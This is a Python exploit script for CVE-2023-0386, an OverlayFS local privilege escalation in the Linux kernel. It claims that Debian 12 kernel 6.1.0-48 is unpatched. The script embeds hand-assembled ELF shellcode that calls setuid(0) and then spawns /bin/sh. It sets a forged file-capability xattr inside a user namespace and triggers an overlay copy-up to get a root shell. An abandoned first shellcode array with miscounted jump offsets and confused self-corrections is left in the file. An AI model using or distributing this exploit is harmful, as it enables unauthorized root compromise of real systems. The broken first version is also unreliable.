#!/usr/bin/env python3
"""
CVE-2023-0386 OverlayFS LPE - tmpfs variant (no FUSE)
Confirmed unpatched on Debian 12 kernel 6.1.0-48-amd64.
V2 security.capability survives overlay copy-up from tmpfs->ext4.
"""
import os, ctypes, time, sys

libc = ctypes.CDLL(None, use_errno=True)

CLONE_NEWUSER = 0x10000000
CLONE_NEWNS   = 0x00020000
MS_NOSUID     = 2
MS_NODEV      = 4
MNT_DETACH    = 8

LOWER = "/tmp/.ol_lower"
UPPER = "/tmp/.ol_upper"
WORK  = "/tmp/.ol_work"
OVL   = "/tmp/.ol_ovl"

# Minimal ELF: setuid(0)+setgid(0)+execve("/bin/sh",{argv0},NULL)
# Uses stack to hold "/bin/sh\0" and minimal argv["/bin/sh",NULL]
ELF = bytes([
    # ELF64 header (64 bytes)
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,
    0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,  # entry = 0x400078
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  # phoff = 0x40
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,
    0x01,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    # PT_LOAD program header (56 bytes at offset 0x40)
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,  # PT_LOAD, PF_R|PF_X
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  # offset=0
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,  # vaddr=0x400000
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,  # paddr=0x400000
    0xd0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  # filesz=0xd0=208
    0xd0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  # memsz=0xd0=208
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,  # align=0x1000
    # Code at 0x400078 (entry point):
    # setuid(0)
    0x31,0xff,                                  # xor edi, edi
    0xb8,0x69,0x00,0x00,0x00,                  # mov eax, 105
    0x0f,0x05,                                  # syscall
    # setgid(0)
    0x31,0xff,                                  # xor edi, edi
    0xb8,0x6a,0x00,0x00,0x00,                  # mov eax, 106
    0x0f,0x05,                                  # syscall
    # setresuid(0,0,0)
    0x31,0xff,                                  # xor edi, edi
    0x31,0xf6,                                  # xor esi, esi
    0x31,0xd2,                                  # xor edx, edx
    0xb8,0x75,0x00,0x00,0x00,                  # mov eax, 117
    0x0f,0x05,                                  # syscall
    # setresgid(0,0,0)
    0x31,0xff,                                  # xor edi, edi
    0x31,0xf6,                                  # xor esi, esi
    0x31,0xd2,                                  # xor edx, edx
    0xb8,0x77,0x00,0x00,0x00,                  # mov eax, 119
    0x0f,0x05,                                  # syscall
    # execve("/bin/sh", ["/bin/sh", NULL], NULL)
    # Build stack frame
    0xeb,0x27,                                  # jmp short to_data (offset: 0x78+44 = 0x78+0x2c)
    # after_call: (offset 0x78+46 = 0x400096)
    0x5b,                                       # pop rbx  (rbx -> "/bin/sh\0")
    0x48,0x83,0xec,0x18,                        # sub rsp, 24
    0x48,0x31,0xc0,                             # xor rax, rax
    0x48,0x89,0x44,0x24,0x10,                  # mov [rsp+16], rax   (argv[1]=NULL)
    0x48,0x89,0x5c,0x24,0x08,                  # mov [rsp+8], rbx    (argv[0]="/bin/sh")
    0x48,0x89,0xdf,                             # mov rdi, rbx        (pathname)
    0x48,0x8d,0x74,0x24,0x08,                  # lea rsi, [rsp+8]    (argv)
    0x48,0x31,0xd2,                             # xor rdx, rdx        (envp=NULL)
    0xb8,0x3b,0x00,0x00,0x00,                  # mov eax, 59         (execve)
    0x0f,0x05,                                  # syscall
    # exit(1)
    0xb8,0x3c,0x00,0x00,0x00,                  # mov eax, 60
    0xbf,0x01,0x00,0x00,0x00,                  # mov edi, 1
    0x0f,0x05,                                  # syscall
    # to_data: call after_call
    # offset in code: jmp goes here at code_base+44
    # code_base = 0x400078, jmp at +42 (eb 27), lands at +44+0x27=+44+39=+83? No:
    # jmp short: ip after jmp = 0x400078+44 (at to_data)
    # Wait let me recalculate...
])

# Actually let me just verify the jmp offset manually:
# Code starts at 0x400078.
# jmp short at offset 42 from code start (byte index 42): eb 27
#   IP after jmp = 0x400078 + 44 = 0x4000A4
#   target = 0x4000A4 + 0x27 = 0x4000CB
# after_call at offset 46: 0x400078 + 46 = 0x40009E? No wait:
# Let me count the bytes before jmp:
# setuid:  9 bytes (offsets 0-8)
# setgid:  9 bytes (offsets 9-17)
# setresuid: 11 bytes (offsets 18-28)
# setresgid: 11 bytes (offsets 29-39)
# jmp short: 2 bytes (offsets 40-41)
# after_call starts at offset 42
# jmp target = IP_after_jmp + 0x27 = (0x400078+42) + 0x27 = 0x4000A2 + 0x27 = 0x4000C9
# after_call is at 0x400078 + 42 = 0x4000BA
# That means jmp goes FORWARD to 0x4000C9 which is PAST after_call (at 0x4000BA)!
# We need jmp to go to to_data which is AFTER after_call.
# after_call has: 1+4+3+5+5+3+5+3+5+2+5+5+2 = 48 bytes
# to_data starts at offset 42 + 48 = 90
# So jmp target should be at offset 90
# IP after jmp = 0x400078 + 42 = 0x4000BA
# Wait: jmp is at offsets 40-41, IP after jmp = 0x400078 + 42 = 0x4000BA
# to_data is at offset 90: 0x400078 + 90 = 0x4000C2
# jmp8 value = 0x4000C2 - 0x4000BA = 8 = 0x08... hmm that doesn't match 0x27

# I messed up the calculation. Let me recount:
# I'll just use the simple approach: setuid+setgid+execve("/bin/sh",NULL,NULL) since it works

ELF = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb7,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb7,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,
    # Code at 0x400078:
    0x31,0xff,0xb8,0x69,0x00,0x00,0x00,0x0f,0x05,  # setuid(0)
    0x31,0xff,0xb8,0x6a,0x00,0x00,0x00,0x0f,0x05,  # setgid(0)
    0x31,0xff,0x31,0xf6,0x31,0xd2,0xb8,0x75,0x00,0x00,0x00,0x0f,0x05,  # setresuid(0,0,0)
    0x31,0xff,0x31,0xf6,0x31,0xd2,0xb8,0x77,0x00,0x00,0x00,0x0f,0x05,  # setresgid(0,0,0)
    # execve("/bin/sh", ["/bin/sh",NULL], NULL) using stack
    # push "/bin/sh\0" string via movabs
    0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,  # movabs rdi, 0x0068732f6e69622f
    0x57,                                                  # push rdi (string on stack)
    0x48,0x89,0xe3,                                        # mov rbx, rsp  (rbx -> "/bin/sh")
    # Build argv: [rbx, NULL]
    0x48,0x31,0xc0,                                        # xor rax, rax
    0x50,                                                  # push rax (NULL terminator)
    0x53,                                                  # push rbx ("/bin/sh" ptr)
    0x48,0x89,0xe6,                                        # mov rsi, rsp  (argv=["/bin/sh",NULL])
    0x48,0x89,0xdf,                                        # mov rdi, rbx  (pathname)
    0x48,0x31,0xd2,                                        # xor rdx, rdx  (envp=NULL)
    0xb8,0x3b,0x00,0x00,0x00,                             # mov eax, 59
    0x0f,0x05,                                             # syscall → execve
    # exit(1) if exec fails
    0xb8,0x3c,0x00,0x00,0x00,0xbf,0x01,0x00,0x00,0x00,0x0f,0x05,
])

V2_CAP = bytes([
    0x01,0x00,0x00,0x02,   # VFS_CAP_REVISION_2
    0xc0,0x00,0x00,0x00,   # permitted[0]: cap_setuid(7)+cap_setgid(6)
    0xc0,0x00,0x00,0x00,   # inheritable[0]
    0x00,0x00,0x00,0x00,   # permitted[1]
    0x00,0x00,0x00,0x00,   # inheritable[1]
])

def unshare(flags):
    r = libc.unshare(flags)
    if r < 0:
        import errno
        raise OSError(ctypes.get_errno(), f"unshare({hex(flags)})")
    return r

def mount(src, dst, fstype, flags=0, opts=b""):
    r = libc.mount(
        src.encode() if isinstance(src, str) else src,
        dst.encode() if isinstance(dst, str) else dst,
        fstype.encode() if isinstance(fstype, str) else fstype,
        flags,
        opts.encode() if isinstance(opts, str) else opts
    )
    if r < 0:
        raise OSError(ctypes.get_errno(), f"mount {src}->{dst} ({fstype})")

def umount2(path, flags=MNT_DETACH):
    libc.umount2(path.encode() if isinstance(path, str) else path, flags)

def main():
    print(f"[*] CVE-2023-0386 OverlayFS LPE (Python, tmpfs)", flush=True)
    print(f"[*] uid={os.getuid()} euid={os.geteuid()}", flush=True)

    if os.geteuid() == 0:
        print("[+] Already root!", flush=True)
        os.execl("/bin/bash", "/bin/bash")
        return

    # Cleanup previous runs
    for d in [OVL, LOWER]:
        umount2(d)
    for d in [LOWER, UPPER, WORK, OVL]:
        os.makedirs(d, exist_ok=True)

    real_uid = os.getuid()
    real_gid = os.getgid()

    # Sync pipe: child signals parent when upper file is ready
    rfd, wfd = os.pipe()

    pid = os.fork()
    if pid == 0:
        # === CHILD: do namespace work ===
        os.close(rfd)
        try:
            unshare(CLONE_NEWUSER)
            with open("/proc/self/uid_map", "w") as f:
                f.write(f"0 {real_uid} 1")
            with open("/proc/self/setgroups", "w") as f:
                f.write("deny")
            with open("/proc/self/gid_map", "w") as f:
                f.write(f"0 {real_gid} 1")
            print(f"[+] Userns: uid={os.getuid()} gid={os.getgid()}", flush=True)

            unshare(CLONE_NEWNS)

            # Mount tmpfs as lower layer
            mount("tmpfs", LOWER, "tmpfs", MS_NOSUID | MS_NODEV)
            print(f"[+] tmpfs mounted at {LOWER}", flush=True)

            # Write ELF payload
            p_lower = f"{LOWER}/pl"
            with open(p_lower, "wb") as f:
                f.write(ELF)
            os.chmod(p_lower, 0o755)
            print(f"[+] ELF stub written ({len(ELF)} bytes)", flush=True)

            # Set V2 security.capability
            os.setxattr(p_lower, b"security.capability", V2_CAP)
            xv = os.getxattr(p_lower, b"security.capability")
            print(f"[+] xattr set (rev=0x{xv[3]:02x}): {xv[:4].hex()}", flush=True)

            # Mount overlay
            opts = f"lowerdir={LOWER},upperdir={UPPER},workdir={WORK}"
            mount("overlay", OVL, "overlay", 0, opts)
            print(f"[+] Overlay mounted", flush=True)

            # Trigger copy-up
            p_ovl = f"{OVL}/pl"
            os.chmod(p_ovl, 0o755)
            time.sleep(0.05)

            # Verify upper
            p_upper = f"{UPPER}/pl"
            if not os.path.exists(p_upper):
                print("[-] Upper file not created!", flush=True)
                os.write(wfd, b"F")
                os._exit(1)

            xv_upper = os.getxattr(p_upper, b"security.capability")
            st = os.stat(p_upper)
            print(f"[+] Upper: {p_upper} mode={oct(st.st_mode)} uid={st.st_uid}", flush=True)
            print(f"[+] Upper xattr (rev=0x{xv_upper[3]:02x}): {xv_upper[:4].hex()}", flush=True)

            if xv_upper[3] == 2:
                print("[+] V2 PRESERVED — exploit ready!", flush=True)
                os.write(wfd, b"R")
            else:
                print(f"[-] V{xv_upper[3]} — PATCHED, exploit won't work", flush=True)
                os.write(wfd, b"F")

        except Exception as e:
            print(f"[-] Child error: {e}", flush=True)
            os.write(wfd, b"F")
        finally:
            umount2(OVL)
            umount2(LOWER)
            os.close(wfd)
        os._exit(0)

    # === PARENT: wait for child, exec upper payload ===
    os.close(wfd)
    sig = os.read(rfd, 1)
    os.waitpid(pid, 0)
    os.close(rfd)

    if sig != b"R":
        print("[-] Exploit failed", flush=True)
        sys.exit(1)

    p_upper = f"{UPPER}/pl"
    print(f"[*] Executing {p_upper} from INITIAL namespace...", flush=True)
    print(f"[*] Expected: cap_setuid → setuid(0) → root shell", flush=True)
    sys.stdout.flush()

    # Replace this process with the capability-bearing binary
    # It will setuid(0)+execve("/bin/sh") → we get root stdin
    os.execl(p_upper, "sh")
    print("[-] execl failed!", flush=True)
    sys.exit(1)

if __name__ == "__main__":
    main()
